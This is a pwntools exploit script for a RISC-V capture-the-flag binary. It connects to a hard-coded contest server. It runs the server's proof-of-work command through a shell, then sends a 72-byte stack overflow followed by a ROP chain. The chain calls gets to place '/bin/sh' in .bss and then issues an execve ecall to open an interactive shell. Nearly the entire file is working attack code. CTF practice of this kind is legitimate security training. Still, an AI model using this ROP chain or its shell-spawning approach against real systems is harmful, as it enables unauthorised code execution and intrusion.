#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="riscv", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'


exe = ELF('./chal')

host, port = "52.59.124.14", "10204"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = process('qemu-riscv64 -g 1234 ./chal',shell=True)
    q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+1100+0 -x gdb-multiarch -ex 'source ~/gdb.plugins/gef/gef.py' -ex 'set architecture riscv64' -ex 'target remote localhost:1234' -ex 'b *0x1064a' -ex 'c'", shell=True)
  else:
    p = process('./run.sh')


# the gadget we will use to set out registers
'''
  3d832:       832a                    mv      t1,a0
   3d834:       60a6                    ld      ra,72(sp)
   3d836:       6522                    ld      a0,8(sp)
   3d838:       65c2                    ld      a1,16(sp)
   3d83a:       6662                    ld      a2,24(sp)
   3d83c:       7682                    ld      a3,32(sp)
   3d83e:       7722                    ld      a4,40(sp)
   3d840:       77c2                    ld      a5,48(sp)
   3d842:       7862                    ld      a6,56(sp)
   3d844:       6886                    ld      a7,64(sp)
   3d846:       2546                    fld     fa0,80(sp)
   3d848:       25e6                    fld     fa1,88(sp)
   3d84a:       3606                    fld     fa2,96(sp)
   3d84c:       36a6                    fld     fa3,104(sp)
   3d84e:       3746                    fld     fa4,112(sp)
   3d850:       37e6                    fld     fa5,120(sp)
   3d852:       280a                    fld     fa6,128(sp)
   3d854:       28aa                    fld     fa7,136(sp)
   3d856:       6149                    addi    sp,sp,144
   3d858:       8302                    jr      t1
'''


ecall = 0x37e34
gadget0 = 0x45a06 # ld a0,16(sp) / ld ra,40(sp) / addi sp,sp,48
gadget1 = 0x3d832

if args.REMOTE:
  print('wait calculating hashcash shit...')
  cmd = p.recvuntil('\n',drop=True)
  s = process(cmd,shell=True)
  s.recvuntil('token: ',drop=True)
  token = s.recvuntil('\n',drop=True)
  s.close()
  p.sendlineafter('token: ', token)

#payload = shellc.ljust(72,'\x00')
payload = 'A'*72
# load a0 with gets address and jump to gadget1
payload += p64(gadget0)+p64(0)*2+p64(exe.sym['gets'])+p64(0)*2+p64(gadget1)
# gets to read /bin/sh string to 0x70f00 (.bss)
payload += p64(0)+p64(0x70f00)+p64(0)*6+p64(221)+p64(gadget0)+p64(0)*8
# load a0 with ecall gadget address and jump to gadget1
payload += p64(0)*2+p64(ecall)+p64(0)*2+p64(gadget1)
# load ecall parameters and do ecall (execve('/bin/sh', 0,0)
payload += p64(0)+p64(0x70f00)+p64(0)*6+p64(221)+p64(ecall)+p64(0)*8


p.sendlineafter('input: \n', payload)
p.sendline('/bin/sh\x00')

p.interactive()


